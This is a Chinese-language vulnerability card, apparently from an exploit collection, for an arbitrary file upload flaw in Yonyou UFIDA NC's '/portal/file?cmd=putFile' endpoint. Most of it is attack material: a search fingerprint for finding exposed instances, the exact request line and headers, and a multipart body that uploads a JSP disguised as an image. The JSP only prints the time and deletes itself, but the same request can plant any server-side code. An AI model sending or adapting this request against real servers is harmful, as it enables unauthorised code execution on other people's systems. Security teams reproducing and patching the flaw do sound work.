# 用友UFIDANCputFile存在任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="用友 UFIDA NC"`
- **请求**：`POST /portal/file?cmd=putFile&pk_org=1 HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 1010`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUscir5wa…`　`Cookie: JSESSIONID=4CE4F022D21FE883F86C892F25CFFA69; JSESSIONID=323578C1A50D1E687A0AB743…`

**请求体 / payload**
```
------WebKitFormBoundaryUscir5wae6fGsk4f
Content-Disposition: form-data; name="pic"; filename="1.jsp"
Content-Type: image/jpeg
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
// 获取当前时间
java.util.Date currentTime = new java.util.Date();
String currentTimeString = currentTime.toString();
// 输出当前时间
out.println(currentTimeString);
// 删除当前文件
java.io.File file = new java.io.File(request.getRealPath(request.getServletPath()));
file.delete();
%>
------WebKitFormBoundaryUscir5wae6fGsk4f
Content-Disposition: form-data; name="style"
file
------WebKitFormBoundaryU…（脚本共 1172 字，完整版见原文）
```

**其他**
- 用友UFIDA NC putFile存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友UFIDA NC